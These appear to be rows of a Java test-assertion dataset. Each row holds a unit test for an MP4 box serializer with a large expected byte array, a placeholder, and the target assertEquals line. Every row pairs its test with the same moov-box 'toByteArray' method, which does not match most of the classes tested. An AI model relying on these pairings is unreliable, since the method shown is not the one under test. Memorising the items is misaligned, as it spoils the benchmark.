0x00, 0x01, 0x5F, (byte) 0x90, 0x00, 0x01, 0x5F, (byte) 0x90, 0x55, (byte) 0xC4, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2D, 0x68, 0x64, 0x6C, 0x72, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x76, 0x69, 0x64, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x56, 0x69, 0x64, 0x65, 0x6F, 0x48, 0x61, 0x6E, 0x64, 0x6C, 0x65, 0x72, 0x00, 0x00, 0x00, 0x01, 0x2E, 0x6D, 0x69, 0x6E, 0x66, 0x00, 0x00, 0x00, 0x14, 0x76, 0x6D, 0x68, 0x64, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x24, 0x64, 0x69, 0x6E, 0x66, 0x00, 0x00, 0x00, 0x1C, 0x64, 0x72, 0x65, 0x66, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x0C, 0x75, 0x72, 0x6C, 0x20, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, (byte) 0xEE, 0x73, 0x74, 0x62, 0x6C, 0x00, 0x00, 0x00, (byte) 0xA2, 0x73, 0x74, (byte) 0x73, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, (byte) 0x92, 0x61, 0x76, 0x63, 0x31, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, (byte) 0x80, 0x04, 0x38, 0x00, 0x48, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x12, 0x62, 0x69, 0x6E, 0x65, 0x6C, 0x70, 0x72, 0x6F, 0x2E, 0x72, 0x75, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // compressorname 0x00, 0x18, 0x11, 0x11, 0x00, 0x00, 0x00, 0x28, 0x61, 0x76, 0x63, 0x43, 0x01, 0x64, 0x00, 0x2A, (byte) 0xFF, (byte) 0xE1, 0x00, 0x11, 0x67, 0x64, 0x00, 0x2A, (byte) 0xAC, 0x2B, 0x50, 0x3C, 0x01, 0x13, (byte) 0xF2, (byte) 0xCD, (byte) 0xC0, 0x40, 0x40, 0x40, (byte) 0x80, 0x01, 0x00, 0x04, 0x68, (byte) 0xEE, 0x3C, (byte) 0xB0, 0x00, 0x00, 0x00, 0x14, 0x62, 0x74, 0x72, 0x74, 0x00, 0x1C, (byte) 0x9C, (byte) 0x80, 0x00, 0x2D, (byte) 0xC6, (byte) 0xC0, 0x00, 0x2D, (byte) 0xC6, (byte) 0xC0, 0x00, 0x00, 0x00, 0x10, 0x73, 0x74, 0x74, 0x73, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x73, 0x74, 0x73, 0x63, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x14, 0x73, 0x74, 0x73, 0x7A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x73, 0x74, 0x63, 0x6F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  0x00, 0x00, 0x00, 0x28, 0x6D, 0x76, 0x65, 0x78, 0x00, 0x00, 0x00, 0x20, 0x74, 0x72, 0x65, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, }; Mp4MoovBox box = new Mp4MoovBox(Collections.singletonList(this.trackInfo)); ""<AssertPlaceHolder>""; }
toByteArray() { int size = this.byteArrayLength(); ByteWriteBuff buff = ByteWriteBuff.newInstance(size) .putInteger(size) .putBytes(this.mp4Type.getByteArray()) .putBytes(this.mvhdBox.toByteArray()); this.trakBoxes.forEach(x -> buff.putBytes(x.toByteArray())); buff.putBytes(this.mvexBox.toByteArray()); return buff.getData(); }"	assertArrayEquals(expect, box.toByteArray())
"mp4MvhdBox() { byte[] expect = new byte[]{ 0x00, 0x00, 0x00, 0x6C, 0x6D, 0x76, 0x68, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x01, 0x5F, (byte) 0x90, 0x00, 0x01, 0x5F, (byte) 0x90, 0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, }; Mp4MvhdBox box = new Mp4MvhdBox(this.trackInfo); ""<AssertPlaceHolder>""; }
toByteArray() { int size = this.byteArrayLength(); ByteWriteBuff buff = ByteWriteBuff.newInstance(size) .putInteger(size) .putBytes(this.mp4Type.getByteArray()) .putBytes(this.mvhdBox.toByteArray()); this.trakBoxes.forEach(x -> buff.putBytes(x.toByteArray())); buff.putBytes(this.mvexBox.toByteArray()); return buff.getData(); }"	assertArrayEquals(expect, box.toByteArray())
"mp4TrakBox() { byte[] expect = new byte[]{ 0x00, 0x00, 0x01, (byte) 0xE7, 0x74, 0x72, 0x61, 0x6B,  0x00, 0x00, 0x00, 0x5C, 0x74, 0x6B, 0x68, 0x64, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x5F, (byte) 0x90, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x07, (byte) 0x80, 0x00, 0x00, 0x04, 0x38, 0x00, 0x00,  0x00, 0x00, 0x01, (byte) 0x83, 0x6D, 0x64, 0x69, 0x61, 0x00, 0x00, 0x00, 0x20, 0x6D, 0x64, 0x68, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x03, 0x00, 0x01, 0x5F, (byte) 0x90, 0x00, 0x01, 0x5F, (byte) 0x90, 0x55, (byte) 0xC4, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2D, 0x68, 0x64, 0x6C, 0x72, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x76, 0x69, 0x64, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x56, 0x69, 0x64, 0x65, 0x6F, 0x48, 0x61, 0x6E, 0x64, 0x6C, 0x65, 0x72, 0x00, 0x00, 0x00, 0x01, 0x2E, 0x6D, 0x69, 0x6E, 0x66, 0x00, 0x00, 0x00, 0x14, 0x76, 0x6D, 0x68, 0x64, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x24, 0x64, 0x69, 0x6E, 0x66, 0x00, 0x00, 0x00, 0x1C, 0x64, 0x72, 0x65, 0x66, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x0C, 0x75, 0x72, 0x6C, 0x20, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, (byte) 0xEE, 0x73, 0x74, 0x62, 0x6C, 0x00, 0x00, 0x00, (byte) 0xA2, 0x73, 0x74, (byte) 0x73, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, (byte) 0x92, 0x61, 0x76, 0x63, 0x31, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, (byte) 0x80, 0x04, 0x38, 0x00, 0x48, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x12, 0x62, 0x69, 0x6E, 0x65, 0x6C, 0x70, 0x72, 0x6F, 0x2E, 0x72, 0x75, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // compressorname 0x00, 0x18, 0x11, 0x11, 0x00, 0x00, 0x00, 0x28, 0x61, 0x76, 0x63, 0x43, 0x01, 0x64, 0x00, 0x2A, (byte) 0xFF, (byte) 0xE1, 0x00, 0x11, 0x67, 0x64, 0x00, 0x2A, (byte) 0xAC, 0x2B, 0x50, 0x3C, 0x01, 0x13, (byte) 0xF2, (byte) 0xCD, (byte) 0xC0, 0x40, 0x40, 0x40, (byte) 0x80, 0x01, 0x00, 0x04, 0x68, (byte) 0xEE, 0x3C, (byte) 0xB0, 0x00, 0x00, 0x00, 0x14, 0x62, 0x74, 0x72, 0x74, 0x00, 0x1C, (byte) 0x9C, (byte) 0x80, 0x00, 0x2D, (byte) 0xC6, (byte) 0xC0, 0x00, 0x2D, (byte) 0xC6, (byte) 0xC0, 0x00, 0x00, 0x00, 0x10, 0x73, 0x74, 0x74, 0x73, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x73, 0x74, 0x73, 0x63, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x14, 0x73, 0x74, 0x73, 0x7A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x73, 0x74, 0x63, 0x6F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, }; Mp4TrakBox box = new Mp4TrakBox(this.trackInfo); ""<AssertPlaceHolder>""; }
toByteArray() { int size = this.byteArrayLength(); ByteWriteBuff buff = ByteWriteBuff.newInstance(size) .putInteger(size) .putBytes(this.mp4Type.getByteArray()) .putBytes(this.mvhdBox.toByteArray()); this.trakBoxes.forEach(x -> buff.putBytes(x.toByteArray())); buff.putBytes(this.mvexBox.toByteArray()); return buff.getData(); }"	assertArrayEquals(expect, box.toByteArray())
"mp4TkhdBox() { byte[] expect = new byte[]{ 0x00, 0x00, 0x00, 0x5C, 0x74, 0x6B, 0x68, 0x64, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x5F, (byte) 0x90, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x07, (byte) 0x80, 0x00, 0x00, 0x04, 0x38, 0x00, 0x00, }; Mp4TkhdBox box = new Mp4TkhdBox(this.trackInfo); ""<AssertPlaceHolder>""; }
toByteArray() { int size = this.byteArrayLength(); ByteWriteBuff buff = ByteWriteBuff.newInstance(size) .putInteger(size) .putBytes(this.mp4Type.getByteArray()) .putBytes(this.mvhdBox.toByteArray()); this.trakBoxes.forEach(x -> buff.putBytes(x.toByteArray())); buff.putBytes(this.mvexBox.toByteArray()); return buff.getData(); }"	assertArrayEquals(expect, box.toByteArray())
"mp4MdiaBox() { byte[] expect = new byte[]{ 0x00, 0x00, 0x01, (byte) 0x83, 0x6D, 0x64, 0x69, 0x61,  0x00, 0x00, 0x00, 0x20, 0x6D, 0x64, 0x68, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x03, 0x00, 0x01, 0x5F, (byte) 0x90, 0x00, 0x01, 0x5F, (byte) 0x90, 0x55, (byte) 0xC4, 0x00, 0x00,  0x00, 0x00, 0x00, 0x2D, 0x68, 0x64, 0x6C, 0x72, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x76, 0x69, 0x64, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x56, 0x69, 0x64, 0x65, 0x6F, 0x48, 0x61, 0x6E, 0x64, 0x6C, 0x65, 0x72, 0x00,  0x00, 0x00, 0x01, 0x2E, 0x6D, 0x69, 0x6E, 0x66, 0x00, 0x00, 0x00, 0x14, 0x76, 0x6D, 0x68, 0x64, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x24, 0x64, 0x69, 0x6E, 0x66, 0x00, 0x00, 0x00, 0x1C, 0x64, 0x72, 0x65, 0x66, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x0C, 0x75, 0x72, 0x6C, 0x20, 0x00, 0x00, 0x00, 0x01,  0x00, 0x00, 0x00, (byte) 0xEE, 0x73, 0x74, 0x62, 0x6C, 0x00, 0x00, 0x00, (byte) 0xA2, 0x73, 0x74, (byte) 0x73, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, (byte) 0x92, 0x61, 0x76, 0x63, 0x31, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, (byte) 0x80, 0x04, 0x38, 0x00, 0x48, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x12, 0x62, 0x69, 0x6E, 0x65, 0x6C, 0x70, 0x72, 0x6F, 0x2E, 0x72, 0x75, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // compressorname 0x00, 0x18, 0x11, 0x11, 0x00, 0x00, 0x00, 0x28, 0x61, 0x76, 0x63, 0x43, 0x01, 0x64, 0x00, 0x2A, (byte) 0xFF, (byte) 0xE1, 0x00, 0x11, 0x67, 0x64, 0x00, 0x2A, (byte) 0xAC, 0x2B, 0x50, 0x3C, 0x01, 0x13, (byte) 0xF2, (byte) 0xCD, (byte) 0xC0, 0x40, 0x40, 0x40, (byte) 0x80, 0x01, 0x00, 0x04, 0x68, (byte) 0xEE, 0x3C, (byte) 0xB0, 0x00, 0x00, 0x00, 0x14, 0x62, 0x74, 0x72, 0x74, 0x00, 0x1C, (byte) 0x9C, (byte) 0x80, 0x00, 0x2D, (byte) 0xC6, (byte) 0xC0, 0x00, 0x2D, (byte) 0xC6, (byte) 0xC0, 0x00, 0x00, 0x00, 0x10, 0x73, 0x74, 0x74, 0x73, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x73, 0x74, 0x73, 0x63, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x14, 0x73, 0x74, 0x73, 0x7A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x73, 0x74, 0x63, 0x6F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, }; Mp4MdiaBox box = new Mp4MdiaBox(this.trackInfo); ""<AssertPlaceHolder>""; }
toByteArray() { int size = this.byteArrayLength(); ByteWriteBuff buff = ByteWriteBuff.newInstance(size) .putInteger(size) .putBytes(this.mp4Type.getByteArray()) .putBytes(this.mvhdBox.toByteArray()); this.trakBoxes.forEach(x -> buff.putBytes(x.toByteArray())); buff.putBytes(this.mvexBox.toByteArray()); return buff.getData(); }"	assertArrayEquals(expect, box.toByteArray())
"mp4MdhdBox() { byte[] expect = new byte[]{ 0x00, 0x00, 0x00, 0x20, 0x6D, 0x64, 0x68, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x03, 0x00, 0x01, 0x5F, (byte) 0x90, 0x00, 0x01, 0x5F, (byte) 0x90, 0x55, (byte) 0xC4, 0x00, 0x00, }; Mp4MdhdBox box = new Mp4MdhdBox(this.trackInfo); ""<AssertPlaceHolder>""; }
toByteArray() { int size = this.byteArrayLength(); ByteWriteBuff buff = ByteWriteBuff.newInstance(size) .putInteger(size) .putBytes(this.mp4Type.getByteArray()) .putBytes(this.mvhdBox.toByteArray()); this.trakBoxes.forEach(x -> buff.putBytes(x.toByteArray())); buff.putBytes(this.mvexBox.toByteArray()); return buff.getData(); }"	assertArrayEquals(expect, box.toByteArray())
"mp4HdlrBox() { byte[] expect = new byte[]{ 0x00, 0x00, 0x00, 0x2D, 0x68, 0x64, 0x6C, 0x72, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x76, 0x69, 0x64, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x56, 0x69, 0x64, 0x65, 0x6F, 0x48, 0x61, 0x6E, 0x64, 0x6C, 0x65, 0x72, 0x00, }; Mp4HdlrBox box = new Mp4HdlrBox(this.trackInfo); ""<AssertPlaceHolder>""; }
toByteArray() { int size = this.byteArrayLength(); ByteWriteBuff buff = ByteWriteBuff.newInstance(size) .putInteger(size) .putBytes(this.mp4Type.getByteArray()) .putBytes(this.mvhdBox.toByteArray()); this.trakBoxes.forEach(x -> buff.putBytes(x.toByteArray())); buff.putBytes(this.mvexBox.toByteArray()); return buff.getData(); }"	assertArrayEquals(expect, box.toByteArray())
"mp4MinfBox() { byte[] expect = new byte[]{ 0x00, 0x00, 0x01, 0x2E, 0x6D, 0x69, 0x6E, 0x66,  0x00, 0x00, 0x00, 0x14, 0x76, 0x6D, 0x68, 0x64, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  0x00, 0x00, 0x00, 0x24, 0x64, 0x69, 0x6E, 0x66, 0x00, 0x00, 0x00, 0x1C, 0x64, 0x72, 0x65, 0x66, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x0C, 0x75, 0x72, 0x6C, 0x20, 0x00, 0x00, 0x00, 0x01,  0x00, 0x00, 0x00, (byte) 0xEE, 0x73, 0x74, 0x62, 0x6C, 0x00, 0x00, 0x00, (byte) 0xA2, 0x73, 0x74, (byte) 0x73, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, (byte) 0x92, 0x61, 0x76, 0x63, 0x31, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, (byte) 0x80, 0x04, 0x38, 0x00, 0x48, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x12, 0x62, 0x69, 0x6E, 0x65, //binelpro.ru 0x6C, 0x70, 0x72, 0x6F, 0x2E, 0x72, 0x75, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // compressorname 0x00, 0x18, 0x11, 0x11, 0x00, 0x00, 0x00, 0x28, 0x61, 0x76, 0x63, 0x43, 0x01, 0x64, 0x00, 0x2A, (byte) 0xFF, (byte) 0xE1, 0x00, 0x11, 0x67, 0x64, 0x00, 0x2A, (byte) 0xAC, 0x2B, 0x50, 0x3C, 0x01, 0x13, (byte) 0xF2, (byte) 0xCD, (byte) 0xC0, 0x40, 0x40, 0x40, (byte) 0x80, 0x01, 0x00, 0x04, 0x68, (byte) 0xEE, 0x3C, (byte) 0xB0, 0x00, 0x00, 0x00, 0x14, 0x62, 0x74, 0x72, 0x74, 0x00, 0x1C, (byte) 0x9C, (byte) 0x80, 0x00, 0x2D, (byte) 0xC6, (byte) 0xC0, 0x00, 0x2D, (byte) 0xC6, (byte) 0xC0, 0x00, 0x00, 0x00, 0x10, 0x73, 0x74, 0x74, 0x73, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x73, 0x74, 0x73, 0x63, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x14, 0x73, 0x74, 0x73, 0x7A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x73, 0x74, 0x63, 0x6F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, }; Mp4MinfBox box = new Mp4MinfBox(this.trackInfo); ""<AssertPlaceHolder>""; }
toByteArray() { int size = this.byteArrayLength(); ByteWriteBuff buff = ByteWriteBuff.newInstance(size) .putInteger(size) .putBytes(this.mp4Type.getByteArray()) .putBytes(this.mvhdBox.toByteArray()); this.trakBoxes.forEach(x -> buff.putBytes(x.toByteArray())); buff.putBytes(this.mvexBox.toByteArray()); return buff.getData(); }"	assertArrayEquals(expect, box.toByteArray())
"mp4VmhdBox() { byte[] expect = new byte[]{ 0x00, 0x00, 0x00, 0x14, 0x76, 0x6D, 0x68, 0x64, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, }; Mp4VmhdBox box = new Mp4VmhdBox(); ""<AssertPlaceHolder>""; }
toByteArray() { int size = this.byteArrayLength(); ByteWriteBuff buff = ByteWriteBuff.newInstance(size) .putInteger(size) .putBytes(this.mp4Type.getByteArray()) .putBytes(this.mvhdBox.toByteArray()); this.trakBoxes.forEach(x -> buff.putBytes(x.toByteArray())); buff.putBytes(this.mvexBox.toByteArray()); return buff.getData(); }"	assertArrayEquals(expect, box.toByteArray())
"mp4DinfBox() { byte[] expect = new byte[]{ 0x00, 0x00, 0x00, 0x24, 0x64, 0x69, 0x6E, 0x66,  0x00, 0x00, 0x00, 0x1C, 0x64, 0x72, 0x65, 0x66, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x0C, 0x75, 0x72, 0x6C, 0x20, 0x00, 0x00, 0x00, 0x01, }; Mp4DinfBox box = new Mp4DinfBox(); ""<AssertPlaceHolder>""; }
toByteArray() { int size = this.byteArrayLength(); ByteWriteBuff buff = ByteWriteBuff.newInstance(size) .putInteger(size) .putBytes(this.mp4Type.getByteArray()) .putBytes(this.mvhdBox.toByteArray()); this.trakBoxes.forEach(x -> buff.putBytes(x.toByteArray())); buff.putBytes(this.mvexBox.toByteArray()); return buff.getData(); }"	assertArrayEquals(expect, box.toByteArray())
"mp4DrefBox() { byte[] expect = new byte[]{ 0x00, 0x00, 0x00, 0x1C, 0x64, 0x72, 0x65, 0x66, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x0C, 0x75, 0x72, 0x6C, 0x20, 0x00, 0x00, 0x00, 0x01, }; Mp4DrefBox box = new Mp4DrefBox(); ""<AssertPlaceHolder>""; }
toByteArray() { int size = this.byteArrayLength(); ByteWriteBuff buff = ByteWriteBuff.newInstance(size) .putInteger(size) .putBytes(this.mp4Type.getByteArray()) .putBytes(this.mvhdBox.toByteArray()); this.trakBoxes.forEach(x -> buff.putBytes(x.toByteArray())); buff.putBytes(this.mvexBox.toByteArray()); return buff.getData(); }"	assertArrayEquals(expect, box.toByteArray())
"mp4StblBox() { byte[] expect = new byte[]{ 0x00, 0x00, 0x00, (byte) 0xEE, 0x73, 0x74, 0x62, 0x6C,  0x00, 0x00, 0x00, (byte) 0xA2, 0x73, 0x74, (byte) 0x73, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, (byte) 0x92, 0x61, 0x76, 0x63, 0x31, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, (byte) 0x80, 0x04, 0x38, 0x00, 0x48, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x12, 0x62, 0x69, 0x6E, 0x65, //binelpro.ru 0x6C, 0x70, 0x72, 0x6F, 0x2E, 0x72, 0x75, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // compressorname 0x00, 0x18, 0x11, 0x11, 0x00, 0x00, 0x00, 0x28, 0x61, 0x76, 0x63, 0x43, 0x01, 0x64, 0x00, 0x2A, (byte) 0xFF, (byte) 0xE1, 0x00, 0x11, 0x67, 0x64, 0x00, 0x2A, (byte) 0xAC, 0x2B, 0x50, 0x3C, 0x01, 0x13, (byte) 0xF2, (byte) 0xCD, (byte) 0xC0, 0x40, 0x40, 0x40, (byte) 0x80, 0x01, 0x00, 0x04, 0x68, (byte) 0xEE, 0x3C, (byte) 0xB0, 0x00, 0x00, 0x00, 0x14, 0x62, 0x74, 0x72, 0x74, 0x00, 0x1C, (byte) 0x9C, (byte) 0x80, 0x00, 0x2D, (byte) 0xC6, (byte) 0xC0, 0x00, 0x2D, (byte) 0xC6, (byte) 0xC0,  0x00, 0x00, 0x00, 0x10, 0x73, 0x74, 0x74, 0x73, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  0x00, 0x00, 0x00, 0x10, 0x73, 0x74, 0x73, 0x63, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  0x00, 0x00, 0x00, 0x14, 0x73, 0x74, 0x73, 0x7A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  0x00, 0x00, 0x00, 0x10, 0x73, 0x74, 0x63, 0x6F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, }; Mp4StblBox box = new Mp4StblBox(this.trackInfo); ""<AssertPlaceHolder>""; }
toByteArray() { int size = this.byteArrayLength(); ByteWriteBuff buff = ByteWriteBuff.newInstance(size) .putInteger(size) .putBytes(this.mp4Type.getByteArray()) .putBytes(this.mvhdBox.toByteArray()); this.trakBoxes.forEach(x -> buff.putBytes(x.toByteArray())); buff.putBytes(this.mvexBox.toByteArray()); return buff.getData(); }"	assertArrayEquals(expect, box.toByteArray())
